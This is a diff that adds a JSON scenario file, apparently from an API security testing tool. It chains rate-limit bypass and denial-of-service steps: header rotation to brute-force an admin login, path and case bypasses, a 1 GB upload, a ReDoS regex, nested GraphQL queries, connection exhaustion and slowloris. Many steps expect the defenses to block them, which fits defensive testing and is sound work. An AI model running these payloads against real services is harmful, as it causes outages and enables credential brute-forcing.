@@ -1,0 +1,234 @@
+{
+  "id": "api-demo-rate-limiting-dos",
+  "name": "Chimera Rate Limiting & DoS Attacks",
+  "category": "Denial of Service",
+  "difficulty": "Intermediate",
+  "description": "Rate limiting bypass and resource exhaustion attacks",
+  "steps": [
+    {
+      "id": "rate-limit-probe",
+      "name": "Rate Limit Discovery",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/products/search?q=test"
+      },
+      "execution": {
+        "delayMs": 50,
+        "iterations": 10
+      }
+    },
+    {
+      "id": "concurrent-flood",
+      "name": "Concurrent Request Flooding",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/products/search?q=laptop"
+      },
+      "execution": {
+        "iterations": 100
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "rate-limit-probe"
+      ]
+    },
+    {
+      "id": "header-rotation-bypass",
+      "name": "Rate Limit Bypass via Header Rotation",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/v1/auth/login",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": "{{random_ip}}",
+          "X-Real-IP": "{{random_ip}}",
+          "X-Originating-IP": "{{random_ip}}"
+        },
+        "body": {
+          "username": "admin",
+          "password": "password{{iteration}}"
+        }
+      },
+      "execution": {
+        "delayMs": 100,
+        "iterations": 50
+      },
+      "dependsOn": [
+        "concurrent-flood"
+      ]
+    },
+    {
+      "id": "case-variation-bypass",
+      "name": "Case Variation Rate Limit Bypass",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/API/Products/SEARCH?q=test"
+      },
+      "execution": {
+        "delayMs": 100,
+        "iterations": 20
+      },
+      "dependsOn": [
+        "header-rotation-bypass"
+      ]
+    },
+    {
+      "id": "path-normalization-bypass",
+      "name": "Path Normalization Bypass",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/../api/products/search?q=test"
+      },
+      "execution": {
+        "delayMs": 100
+      },
+      "dependsOn": [
+        "case-variation-bypass"
+      ]
+    },
+    {
+      "id": "resource-exhaustion-upload",
+      "name": "Large File Upload DoS",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/upload",
+        "headers": {
+          "Content-Type": "multipart/form-data",
+          "Content-Length": "1073741824"
+        },
+        "body": "{{large_payload_1gb}}"
+      },
+      "execution": {
+        "delayMs": 5000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "path-normalization-bypass"
+      ]
+    },
+    {
+      "id": "algorithmic-complexity",
+      "name": "Algorithmic Complexity Attack",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/regex/match",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "pattern": "(a+)+$",
+          "text": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaab"
+        }
+      },
+      "execution": {
+        "delayMs": 3000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "resource-exhaustion-upload"
+      ]
+    },
+    {
+      "id": "connection-pool-exhaustion",
+      "name": "Connection Pool Exhaustion",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/slow-endpoint",
+        "headers": {
+          "Connection": "keep-alive",
+          "Keep-Alive": "timeout=3600"
+        }
+      },
+      "execution": {
+        "iterations": 1000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "algorithmic-complexity"
+      ]
+    },
+    {
+      "id": "cache-poisoning-dos",
+      "name": "Cache Poisoning DoS",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/products/list",
+        "headers": {
+          "X-Cache-Key": "{{random_key}}",
+          "Cache-Control": "no-cache"
+        }
+      },
+      "execution": {
+        "delayMs": 200,
+        "iterations": 100
+      },
+      "dependsOn": [
+        "connection-pool-exhaustion"
+      ]
+    },
+    {
+      "id": "graphql-depth-attack",
+      "name": "GraphQL Query Depth Attack",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/graphql",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "query": "{user{posts{comments{author{posts{comments{author{posts{comments{author{name}}}}}}}}}}"
+        }
+      },
+      "execution": {
+        "delayMs": 2000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "cache-poisoning-dos"
+      ]
+    },
+    {
+      "id": "slowloris-simulation",
+      "name": "Slowloris Attack Simulation",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/data/import",
+        "headers": {
+          "Content-Type": "application/json",
+          "Transfer-Encoding": "chunked"
+        },
+        "body": "{{slow_chunks}}"
+      },
+      "execution": {
+        "delayMs": 100
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "graphql-depth-attack"
+      ]
+    }
+  ]
+}
